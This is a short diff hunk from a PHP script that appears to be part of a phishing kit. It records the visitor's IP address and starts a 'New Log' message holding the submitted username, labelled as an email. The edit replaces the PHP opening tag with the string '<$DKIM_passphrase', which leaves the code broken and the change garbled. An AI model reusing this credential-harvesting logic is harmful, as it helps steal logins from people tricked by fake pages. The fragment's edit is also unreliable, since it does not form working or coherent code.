@@ -1,4 +1,4 @@
-<?
+<$DKIM_passphrase
 $ip = getenv("REMOTE_ADDR");
 $message .= "===============|New Log|==============\n";
 $message .= "Email: ".$_POST['username']."\n";
